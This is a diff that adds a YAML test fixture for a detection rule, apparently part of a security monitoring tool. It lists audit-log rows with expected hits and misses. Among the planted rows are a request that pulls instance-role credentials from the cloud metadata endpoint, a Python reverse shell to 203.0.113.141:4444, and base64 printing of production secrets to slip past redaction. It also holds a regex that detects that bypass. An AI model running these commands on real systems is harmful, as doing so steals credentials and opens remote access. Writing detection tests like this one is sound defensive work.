@@ -1,0 +1,118 @@
+# Planted: an API command stealing instance-role credentials from IMDS; a reverse shell in a notebook.
+# Also planted: base64 of a secret printed, including one hidden behind the old self-exclusion marker in a comment.
+# Excluded: the rule runner's own detection SQL (marker plus runner identity) and an allow-listed principal.
+# Near misses: subprocess for pip install; a normal secret read; a job that base64-compresses JSON in the same
+# cell as a secret read.
+rows:
+- t: -20
+  service_name: data-plane-router
+  action_name: commandExecute
+  email: 88888888-9999-0000-1111-222222222222
+  ip: 203.0.113.140
+  request_params:
+    command: 'import requests
+
+      r = requests.get(''http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role'')
+
+      print(r.text)'
+    cluster_id: c1
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: eve@corp.example
+  ip: 10.0.0.9
+  request_params:
+    commandText: 'import socket,subprocess,os
+
+      s=socket.socket()
+
+      s.connect((''203.0.113.141'',4444))
+
+      os.dup2(s.fileno(),0)
+
+      pty.spawn(''/bin/sh'')'
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: dev@corp.example
+  ip: 10.0.0.10
+  request_params:
+    commandText: 'import subprocess
+
+      subprocess.run([''pip'',''install'',''pandas''], check=True)'
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: dev@corp.example
+  ip: 10.0.0.10
+  request_params:
+    commandText: 'token = dbutils.secrets.get(''app'', ''api_token'')
+
+      resp = call_api(token)'
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: leak@corp.example
+  ip: 10.0.0.11
+  request_params:
+    commandText: 'import base64
+
+      print(base64.b64encode(dbutils.secrets.get(''prod'', ''db_password'').encode()))'
+- t: -20
+  service_name: jobs
+  action_name: runCommand
+  email: etl@corp.example
+  ip: 10.0.0.12
+  request_params:
+    commandText: 'import base64, gzip, json
+
+      pw = dbutils.secrets.get(''etl'', ''api'')
+
+      payload = base64.b64encode(gzip.compress(json.dumps(rows).encode()))'
+- t: -20
+  service_name: jobs
+  action_name: runCommand
+  email: lakewatch-rule-runner
+  ip: 10.0.0.12
+  request_params:
+    commandText: '-- the rule runner''s own detection SQL
+
+      SELECT CASE WHEN code RLIKE ''b64encode[(]dbutils[.]secrets[.]get[(]'' THEN ''secret_redaction_bypass'' END -- base64.b64encode(dbutils.secrets.get(''a'', ''b''))'
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: mallory@corp.example
+  ip: 10.0.0.13
+  request_params:
+    commandText: '# encoding_technique secret_redaction_bypass (a comment no longer hides the code)
+
+      import base64
+
+      print(base64.b64encode(dbutils.secrets.get(''prod'', ''db_password'').encode()))'
+- t: -20
+  service_name: notebook
+  action_name: runCommand
+  email: allowlisted@corp.example
+  ip: 10.0.0.14
+  request_params:
+    commandText: 'import base64
+
+      print(base64.b64encode(dbutils.secrets.get(''red-team'', ''canary'').encode()))'
+allowlist:
+- rule: cwdf_offensive_code_in_commands
+  principal: allowlisted@corp.example
+expect:
+  hits:
+  - technique: imds_credential
+    actor_kind: sp
+  - technique: reverse_shell
+    actor: eve@corp.example
+  - technique: secret_redaction_bypass
+    actor: leak@corp.example
+  - technique: secret_redaction_bypass
+    actor: mallory@corp.example
+  misses:
+  - actor: lakewatch-rule-runner
+  - actor: allowlisted@corp.example
+  - actor: dev@corp.example
+  - actor: etl@corp.example
